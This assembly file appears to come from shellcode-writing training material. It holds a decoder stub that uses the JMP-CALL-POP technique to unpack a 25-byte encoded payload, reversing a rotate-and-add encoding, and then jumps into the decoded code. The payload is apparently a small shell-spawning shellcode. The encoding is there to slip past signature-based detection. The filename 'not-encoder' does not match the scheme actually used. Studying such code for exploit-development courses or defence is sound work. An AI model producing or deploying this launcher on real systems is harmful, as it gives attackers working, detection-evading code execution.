; Filename: not-encoder.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25


decode:
	
	xor ebx, ebx
	mov byte bl, [esi]
	rol bl, 1
	add bl, 7
	mov byte [esi], bl

	inc esi
	loop decode

	jmp short EncodedShellcode

call_shellcode:

	call decoder

	EncodedShellcode: db 0x15,0xdc,0xa4,0xb0,0x14,0x14,0x36,0xb0,0xb0,0x14,0xad,0x31,0xb3,0x41,0x6e,0xa4,0x41,0xed,0x26,0x41,0x6d,0xd4,0x02,0x63,0xbc